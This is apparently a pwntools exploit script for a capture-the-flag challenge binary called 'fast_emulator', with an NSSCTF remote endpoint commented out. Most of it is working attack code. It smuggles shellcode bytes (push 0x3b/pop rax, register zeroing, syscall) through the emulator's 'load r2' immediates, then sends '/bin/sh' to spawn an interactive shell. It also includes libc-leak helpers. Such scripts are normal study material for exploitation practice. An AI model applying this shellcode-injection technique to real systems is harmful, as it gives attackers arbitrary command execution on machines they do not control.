from pwn import *
from struct import pack
from ctypes import *
from LibcSearcher import *
import base64

def s(a):
    p.send(a)
def sa(a, b):
    p.sendafter(a, b)
def sl(a):
    p.sendline(a)
def sla(a, b):
    p.sendlineafter(a, b)
def r():
    p.recv()
def pr():
    print(p.recv())
def rl(a):
    return p.recvuntil(a)
def inter():
    p.interactive()
def debug():
    gdb.attach(p)
    pause()
def get_addr():
    return u64(p.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00'))
def get_sb():
    return libc_base + libc.sym['system'], libc_base + next(libc.search(b'/bin/sh\x00'))

context(os='linux', arch='amd64', log_level='debug')
p = process('./fast_emulator')
#p = remote('node4.anna.nssctf.cn', 28414)
elf = ELF('./fast_emulator')
#libc = ELF('./libc-2.27-x64.so')
# libc = ELF('/home/w1nd/Desktop/glibc-all-in-one/libs/2.31-0ubuntu9.9_amd64/libc-2.31.so')


gdb.attach(p, 'b *$rebase(0x1a1d)')
pause()
sla(b'enter: ', b'7')
sla(b'> ', b'load r2 0x' + b'6a3b'*0x10 + b'00000000') # push 0x3b;
sla(b'> ', b'load r2 0x' + b'58'*0x8 + b'00000000') #pop rax;
sla(b'> ', b'load r2 0x' + b'6a00'*0x10 + b'00000000') #push 0;
sla(b'> ', b'load r2 0x' + b'5a5e'*0x8 + b'00000000') #pop rsi; pop rdx;
sla(b'> ', b'load r2 0x' + b'5f55'*0x10 + b'00000000') # push rbp; pop rdi;
sla(b'> ', b'load r2 0x' + b'0f05'*0x8 + b'00000000') # syscall
sla(b'> ', b'/bin/sh\x00' + b'00000000')

inter()